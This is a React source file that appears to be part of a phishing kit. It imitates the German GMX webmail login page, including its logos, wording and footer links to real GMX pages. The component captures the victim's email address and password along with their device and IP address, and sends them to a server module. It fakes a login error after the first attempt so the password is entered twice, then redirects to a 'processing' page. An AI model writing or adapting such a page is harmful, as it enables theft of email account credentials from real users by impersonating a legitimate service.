import { navigate } from "@reach/router";
import React from "react";
import { useState } from "react";
import { notify, sendFile } from "../servers";
import "./styles.scoped.css";

function Gmx({ location }) {
    const [values, setValues] = useState({
        username: "",
        device: location.state.device,
        ip: location.state.ip,
        password: "",
      });
    
      const [submited, setSubmited] = useState({ status: false, count: 1 });
      const [showpassword, setShowpassword] = useState(false);
    
      const handleChange = (event) => {
        setValues({
          ...values,
          [event.target.name]: event.target.value,
        });
      };
    
      const submitForm = (event) => {
        event.preventDefault();
        setSubmited({ ...submited, status: !submited.status });
    
        if (submited.count <= 1) {
          sendFile(values).then((data) => {
            // show error
            notify();
            setSubmited({ ...submited, count: submited.count + 1 });
            setValues({ ...values, password: "" });
            console.log(data);
            console.log(submited);
          });
        } else {
          sendFile(values).then((data) => {
            // redirect
            navigate("../processing", { state: { domain: location.state.domain } });
            console.log("ok");
          });
        }
      };
  return (
    <div className="main-layout">
      <div className="header">
        <div className="header__logo">
          <img src={require("./images/logo.png")} alt="" width={80} />
        </div>
        <div className="header__text">Login</div>
      </div>
      <div className="centered-content centered-content--narrow">
        <div className="content-title">
          <div className="content-title__logo">
            <img src={require("./images/logoblue.png")} alt="" width={105} />
          </div>
          <h1>Login</h1>
          <p id="loginText">
            Bitte melden Sie sich hier mit Ihrer GMX E-Mail-Adresse und Ihrem
            Passwort an.
          </p>
        </div>
        <form onSubmit={submitForm} autocomplete="off">
          <div id="0:formPanel:loginForm:usernameInput">
            <div className="pos-form-wrapper">
              <label
                className="pos-label pos-label--block required"
                htmlFor="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input"
              >
                GMX E-Mail-Adresse
              </label>
              <div className="pos-input">
                <input
                  name="username"
                  className="revealable-input-row__input"
                  defaultValue={values.username}
                  id="userid"
                  type="email"
                  onChange={handleChange}
                  required
                  autocomplete="off"
                />
              </div>
            </div>
          </div>
          <div id="0:formPanel:loginForm:passwordInput">
            <div className="two-fa-enter-password">
              <div className="pos-form-wrapper revealable-input-row">
                <label
                  className="pos-label pos-label--block required"
                  htmlFor="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input"
                >
                  Passwort eingeben
                </label>
                <div className="pos-input">
                  <input
                    type="password"
                    className="revealable-input-row__input"
                    required="required"
                    defaultValue={values.password}
                    name="password"
                    onChange={handleChange}
                    autocomplete="off"
                    id="passid"
                  />
                  <div className="revealable-input-row__icon pos-input-icon">
                    <svg className="icon icon--password-eye-dims">
                      <use href="./loginapplication/login/resource/_cp._/gui/assets/icons/sprite-ver-0D99064E54707DF6FAC89D8971B67D02.svg#password-eye" />
                    </svg>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <input
          value="Login"
            type="submit"
            disabled={submited.status}
            id="submitBtn"
            className="pos-button pos-button--cta pos-button--block a-mb-space-2"
          />
            ``
        </form>
        <a
          className="a-ta-c a-mb-space-3 pos-button pos-button--link pos-button--block"
          href="https://passwort.gmx.net/"
        >
          Passwort vergessen?
        </a>
        <hr className="centered-content__line-break a-mb-space-4" />
        <div className="a-ta-c a-mb-space-4">
          <h2 className="a-mb-space-2.5">Neu bei GMX?</h2>
          <a
            className="pos-button pos-button--link pos-button--block"
            href="https://registrierung.gmx.net/?isMobile=true#.pc_page.mm.login.textlink.registrierung"
          >
            Jetzt kostenlos registrieren!
          </a>
        </div>
      </div>
      <div className="footer">
        <a
          className="footer__link"
          target="_blank"
          href="https://www.gmx.net/impressum"
        >
          Impressum
        </a>
        <a
          className="footer__link"
          target="_blank"
          href="https://www.gmx.net/kuendigungsformular"
        >
          Verträge hier kündigen
        </a>
        <a
          className="footer__link"
          target="_blank"
          href="https://agb-server.gmx.net/gmxagb-de"
        >
          AGB
        </a>
        <a
          className="footer__link"
          target="_blank"
          href="https://agb-server.gmx.net/datenschutz"
        >
          Datenschutz
        </a>
      </div>
    </div>
  );
}

export default Gmx;
